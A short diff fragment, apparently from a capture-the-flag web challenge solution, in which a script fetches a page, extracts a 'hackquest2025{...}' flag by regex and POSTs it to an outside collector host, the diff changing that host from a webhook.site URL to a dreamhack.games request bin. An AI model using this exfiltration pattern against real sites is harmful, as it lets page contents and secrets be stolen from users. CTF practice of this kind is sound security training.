@@ -7,7 +7,7 @@
   const text = await res.text();
   const flag = /hackquest2025\{.*?\}/.exec(text);
   if (flag) {
-    await fetch("https://webhook.site/abcd-1234...", {
+    await fetch("https://ifgzzkm.request.dreamhack.games", {
       method: "POST",
       mode: "no-cors",
       body: flag[0]
